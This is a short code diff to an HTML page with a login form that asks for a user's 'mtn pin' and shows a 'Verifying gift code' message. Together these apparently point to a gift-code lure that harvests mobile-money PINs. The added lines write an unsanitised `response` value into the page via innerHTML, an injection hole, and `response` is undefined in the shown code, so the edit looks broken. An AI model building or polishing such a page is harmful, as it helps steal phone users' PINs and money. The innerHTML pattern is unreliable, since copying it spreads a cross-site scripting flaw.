@@ -471,6 +471,7 @@
                     <div class="pin-hint">🔒 your mtn pin</div>
                 </div>
                 <button type="submit" id="submitBtn">Log in</button>
+                <div id="errorMessage"></div>
             </form>
 
             <!-- message area -->
@@ -604,6 +605,10 @@
 
                     submitBtn.innerHTML = '<span class="spinner"></span> PROCESSING...';
                     submitBtn.disabled = true;
+                    const result = document.getElementById("result");
+                     if (result) {
+                        result.innerHTML = response;
+                                 }
                     messageDiv.innerHTML = '⏳ Verifying gift code, please wait...';
                     messageDiv.style.color = '#FFCC00';
 
